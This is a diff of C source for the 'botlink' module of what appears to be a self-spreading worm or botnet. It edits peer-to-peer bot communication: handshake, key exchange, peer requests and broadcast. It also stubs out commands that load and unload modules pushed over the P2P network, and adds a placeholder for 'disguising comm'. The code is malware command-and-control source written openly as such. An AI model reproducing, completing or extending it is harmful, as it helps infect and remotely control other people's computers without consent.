@@ -61,18 +61,19 @@ ModuleFuncs botlink_funcs = {
     NULL, //&botlink_outgoing,
     &botlink_main_loop,
     &botlink_connect,
-    NULL //&botlink_disconnect,
+    NULL, //&botlink_disconnect,
+    NULL // add messages here for disguising comm
 };
 
 Modules CLK_botlink = {
     // required ( NULL, NULL, 0 )
-    NULL, NULL, 0,
+    NULL, NULL, 0, 1,
     // module ID
-    BOTLINK_MODULE_ID,
+    BOTLINK_MODULE_ID, 0,
     // port, state
     BOT_PORT, 0,
     // required 0, 0..  
-    0, 0,
+    0, 0, 0,
     // timer = 5 seconds .. timeout is 15 so it should be fine for catching bad connections
     // we will run this every 5 seconds since we are a WORM
     5,
@@ -82,10 +83,6 @@ Modules CLK_botlink = {
     NULL, 0
 };
 
-
-
-extern ExternalModules *external_list;
-
 // various states of bot communication
 enum {
     BOT_HANDSHAKE_IN=TCP_CONNECTED,
@@ -93,7 +90,6 @@ enum {
     BOT_KEY_EXCHANGE=4096,
     BOT_PERFECT=STATE_OK
 };
-
 
 
 enum {
@@ -257,8 +253,7 @@ int botlink_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
                     bot_pushcmd(mptr, cptr, BOT_CMD_WANT_PEERS, NULL, 0);
                 }
             }
-        }
-        
+        }      
     } 
     
     for (cptr = mptr->connections; cptr != NULL; cptr = cptr->next) {
@@ -848,13 +843,13 @@ int botlink_cmd_broadcast(Modules *mptr, Connection *cptr, char *buf, int size) 
 
 // loads an external module from a p2p stream
 int botlink_cmd_loadmodule(Modules *mptr, Connection *cptr, char *buf, int size) {
-    ExternalModules *eptr = NULL;
+    Modules *eptr = NULL;
     int ret = 0;
     
     int32_t module_id = get_int32(&buf);
     int32_t module_type = get_int32(&buf);
     
-    eptr = ExternalAdd(NULL, module_type, module_id, buf, size - sizeof(int32_t), 1);
+    //eptr = ExternalAdd(NULL, module_type, module_id, buf, size - sizeof(int32_t), 1);
     
     return (eptr != NULL);
 }
@@ -866,6 +861,7 @@ int botlink_cmd_unloadmodule(Modules *mptr, Connection *cptr, char *buf, int siz
     
     int32_t module_id = get_int32(&buf);
     
+    /*
     // NEXT LINE is hackery.. we dont pass the external functions down the stack..
     // maybe just setup a queue, or remove the need
     if ((eptr = ExternalFind(NULL, module_id)) != NULL) {
@@ -873,7 +869,7 @@ int botlink_cmd_unloadmodule(Modules *mptr, Connection *cptr, char *buf, int siz
         if (ret == 1) {
             L_del((LIST **)external_list, (LIST *)eptr);
         }
-    }
+    }*/
     
     return ret;
 }
